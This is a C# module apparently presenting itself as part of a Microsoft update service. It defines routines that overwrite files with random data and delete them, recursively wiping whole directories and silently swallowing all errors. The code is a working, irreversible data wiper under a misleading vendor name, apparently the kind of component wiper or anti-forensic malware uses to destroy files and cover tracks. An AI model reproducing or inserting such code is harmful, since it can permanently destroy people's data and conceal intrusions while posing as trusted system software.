using System;
using System.IO;
using System.Security.Cryptography;

namespace Microsoft.UpdateService.Modules
{
    public static class CleanupService
    {
        public static void WipeFile(string filePath, int passes = 1)
        {
            try 
            {
                if (!File.Exists(filePath)) return;

                // Set attributes to normal before wiping
                File.SetAttributes(filePath, FileAttributes.Normal);

                long length = new FileInfo(filePath).Length;
                using (var stream = new FileStream(filePath, FileMode.Open, FileAccess.Write))
                {
                    byte[] buffer = new byte[65536];
                    for (int p = 0; p < passes; p++)
                    {
                        long remaining = length;
                        stream.Position = 0;
                        while (remaining > 0)
                        {
                            int toWrite = (int)Math.Min(buffer.Length, remaining);
                            RandomNumberGenerator.Fill(buffer);
                            stream.Write(buffer, 0, toWrite);
                            remaining -= toWrite;
                        }
                    }
                }

                File.Delete(filePath);
            }
            catch { }
        }

        public static void WipeDirectory(string dirPath)
        {
            try 
            {
                if (!Directory.Exists(dirPath)) return;

                // SECURITY: Block attempts to wipe critical system directories if not admin or if target is sensitive
                if (dirPath.ToLower().Contains("windows\\system32") || dirPath.ToLower().Contains("winlogon"))
                {
                    return;
                }

                foreach (var file in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
                {
                    WipeFile(file);
                }

                Directory.Delete(dirPath, true);
            }
            catch { }
        }

        private static bool IsAdmin()
        {
            try
            {
                using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                return new System.Security.Principal.WindowsPrincipal(identity)
                    .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch { return false; }
        }
    }
}
